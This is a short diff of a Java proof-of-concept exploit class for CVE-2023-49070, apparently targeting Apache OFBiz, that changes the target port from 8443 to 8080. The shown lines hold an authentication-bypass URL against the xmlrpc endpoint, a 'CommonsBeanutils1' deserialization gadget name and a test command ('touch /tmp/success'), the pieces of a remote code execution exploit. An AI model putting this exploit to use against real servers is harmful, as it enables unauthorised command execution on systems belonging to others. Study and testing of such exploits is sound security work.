@@ -14,7 +14,7 @@ public class CVE_2023_49070 {
     public static void main(String[] args) throws Exception {
 
 
-        String url = "http://10.58.120.200:8443/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y";
+        String url = "http://10.58.120.200:8080/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y";
 
         String gadget = "CommonsBeanutils1";
         String cmd = "touch /tmp/success";
